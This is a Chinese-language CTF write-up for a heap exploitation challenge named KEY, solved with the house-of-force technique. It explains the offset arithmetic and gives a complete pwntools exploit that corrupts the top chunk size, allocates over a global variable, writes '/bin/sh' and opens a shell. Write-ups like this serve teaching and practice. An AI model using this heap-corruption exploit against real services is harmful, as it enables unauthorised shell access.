# KEY
该题为简单的堆利用，用到的技巧为house of force  
有关house of force的原理可以参考：https://bbs.kanxue.com/thread-222924.htm  
这里只讲述几个需要注意的点：  
我们希望把堆块申请到0x601088这个地址，将这个地址加上0x10的大小的堆头和0x8的read函数的读入偏移后通过read函数写入数据的起始地址为
0x6010a0,这正是key变量所在的地址，我们将/bin/sh\x00写入即可getshell  
```python
top_heap = addr + 0xa0
```
top_heap的地址加0xa0是因为题目中free掉的0xa0大小的chunk没有给top chunk所合并，而是进入到tcache中
```python
heap = 0x601088 - top_heap - 0x10
```
这后面-0x10是为了避免堆头部的16字节对偏移的影响  
完整exp:  
```python
from pwn import *

p = remote("",)

context(arch='arm64', os='linux', log_level='debug')

def add(size,context):
    p.recvuntil('> ')
    p.sendline(b'1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.send(context)

p.recvuntil('gift :D ')
addr = int(p.recvuntil('\n', drop = True),16)
top_heap = addr + 0xa0
success('addr:' + hex(top_heap))
heap = 0x601088 - top_heap - 0x10

add(0x18,b'a'*0x10 + p64(0xffffffffffffffff))
add(heap,b'bbbb')
add(0x10,b'\x00'*8+b'/bin/sh\x00')
p.recvuntil('> ')
p.sendline(b'2')

p.interactive()
```